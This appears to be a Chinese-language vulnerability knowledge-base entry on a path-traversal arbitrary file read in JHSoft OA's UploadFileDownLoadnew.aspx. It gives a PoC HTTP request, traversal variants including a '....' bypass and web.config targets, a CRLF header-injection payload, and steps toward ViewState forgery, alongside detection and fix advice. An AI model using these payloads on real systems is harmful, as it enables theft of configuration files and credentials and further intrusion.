---
id: web-generic-file-inclusion-jhsoft-uploadfiledownloadnew-fcform-traversal
title: JHSoft OA UploadFileDownLoadnew.aspx 的 fcform 分支 FilePath 路径穿越：任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: dotnet-aspx-fcform-filepath-traversal-download
tags:
- file-inclusion
- path-traversal
- dotnet
- aspx
- download
- oa
- jhsoft
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:29+08:00'
  notes: 已对照原文与 img/25-27 核对 Page_Load 以 QueryString.Keys[0]=="fcform" 分派、Downloadfcform 取 FilePath/FileName 后拼 ../JHSoft.Web.Module/ 再 MapPath/MapFilePath、FindFilebyAbsoluteFilePath/GetFile 回显，以及 POST 载荷 \....\....\ 变形。未验证点：原文未给响应/文件内容，替换函数内部未完整展示；与 DownLoadBgImage 为不同端点/参数，dup-scan likely_duplicate 裁决为保留两张。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-jhsoft-uploadfiledownloadnew-fcform-traversal/
draft: false
kb_aliases:
- JHSoft 文件下载穿越
- 金和 OA 任意文件读取
- UploadFileDownLoadnew 任意文件读
- fcform 下载分支
- FilePath 参数穿越
- 四点号 ../ 变形
---

## 一句话结论

JHSoft OA 的 `JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx` 在 QueryString 首个键为 `fcform` 时进入 `Downloadfcform()`，把请求参数 `FilePath` 直接拼到 `../JHSoft.Web.Module/` 前缀后交给 `Server.MapPath`/`Upload.MapFilePath`，没有白名单或根目录约束；用 `..` 或其变形 `....`（可拆成 `..+..`）可穿越目录，读取站点内任意文件。

## 原理

- `Page_Load` 根据 QueryString 第一个键分派：`if (base.Request.QueryString.Keys[0] == "fcform") Downloadfcform();`；否则按 `FileID` 走普通下载，或把 `FilePath` 交给 `InsertFile`。
- `Downloadfcform()` 中：`empty3 = base.Request["FilePath"]; empty = base.Request["FileName"];`，然后按 `Upload.FileServerName` 是否为空分两条路径：
  - 非空：`empty3 = Upload.MapFilePath("../resource/" + empty3)`；
  - 为空：对 `empty3` 转小写、把 `/resource/` 替换成 `/`，再用 `Server.MapPath("../JHSoft.Web.Module/" + empty3)` 或 `Upload.MapFilePath(...)` 映射。
- 最终调用 `Upload.FindFilebyAbsoluteFilePath(empty3, ref empty3)` 判断文件存在，`Upload.GetFile(empty3)` 读取并以 `application/octet-stream` + `BinaryWrite` 返回。
- 缺陷：`FilePath` 直接参与路径拼接，没有 `Path.GetFileName`、没有规范化前缀校验、没有拒绝 `..`。文章给出的归一化过程解释了为何用 `....` 变形：先做 `\` 与 `/` 的替换、再把 `../` 替换成 `/`，而 `/..../` 不含 `../` 子串、可存活到后续步骤，最终被还原成可穿越的 `..\` 结构。
- `FileName` 参数直接拼进 `Content-Disposition: attachment; filename=`，未做规范化/转义，存在响应头注入或文件名欺骗的次要风险。

## 触发条件

- 目标存在 `C6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx`。
- 请求 QueryString 的第一个键为 `fcform`（形如 `?fcform=1&FilePath=...`），确保进入 `Downloadfcform()`。
- 请求能通过统一鉴权；文章请求未展示登录态，实际是否需要会话需按目标确认。
- 应用池进程对目标文件有读权限。

## 利用步骤

1. 先请求 `?fcform=1&FilePath=正常文件名&FileName=x.txt`，确认进入下载分支并返回文件流。
2. 用 `..\` 或 `../` 逐级跳出 `JHSoft.Web.Module` 目录，例如 `FilePath=..\..\web.config`；若目标对 `..` 有替换，使用 `....` 变形（`....` = `..` + `..`）。
3. 文章载荷：`FilePath=\....\....\C6\JHSoft.Web.CustomQuery\UploadFileDownLoadnew.aspx`，用于回读页面自身源码验证穿越。
4. 扩展到 `web.config`、连接串、日志与其他站点源码；结合 MachineKey 进入 ViewState 伪造链。

## PoC

```http
POST /C6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?fcform=1&FilePath=\....\....\C6\JHSoft.Web.CustomQuery\UploadFileDownLoadnew.aspx&FileName=UploadFileDownLoadnew.aspx HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

```text
# 目标：FilePath 穿越后读取指定文件，响应体为文件内容
# FileName 控制下载显示名；文章截图仅展示构造的请求，未给出响应内容
```

## 变体与关联

- 变体：`FilePath=..\..\web.config` / `..%5c..%5cweb.config` / `/..../` 变形，按目标的替换顺序选择。
- 变体：`FileName` 未过滤，可尝试 `FileName=x.asp%0d%0aSet-Cookie:...` 做响应头注入（需 IIS/ASP.NET 版本允许）。
- 关联：[[web-generic-file-inclusion-jhsoft-downloadbgimage-path-read]]（同一 OA 的另一处下载接口任意文件读取）；[[web-generic-file-inclusion-windows-backslash-download-traversal]]（Windows 下载接口只替换正斜杠、反斜杠穿越的同类模式）；[[web-generic-file-inclusion-double-encoded-alternating-dotdot-traversal]]（编码/变形 `../` 绕过）。
- 边界：文章只展示构造的 POST 请求，未展示实际读取到的文件内容；穿越变形的具体替换函数（`Upload.MapFilePath`/`FindFilebyAbsoluteFilePath`）未在截图中完整给出，复现需按目标版本调整 `..` 形态。原文未标注受影响版本。

## 检测与防御

- 检测：`UploadFileDownLoadnew.aspx` 的 `FilePath` 出现 `..`、`....`、反斜杠、`web.config`、盘符等特征；QueryString 首键为 `fcform` 且后续参数异常；下载响应返回源码/配置文件。
- 修复：把 `FilePath` 改为文件 ID 映射；必须用路径时先 `Path.GetFileName` 取 basename，`Path.GetFullPath` 规范化后校验必须位于 `JHSoft.Web.Module` 目录内，拒绝绝对路径与 `..`。
- 加固：`FileName` 做白名单与转义，禁止进入响应头；下载接口增加登录与对象级权限校验；`web.config` 设置 ACL 并避免 IIS 直接下载 `.config`。
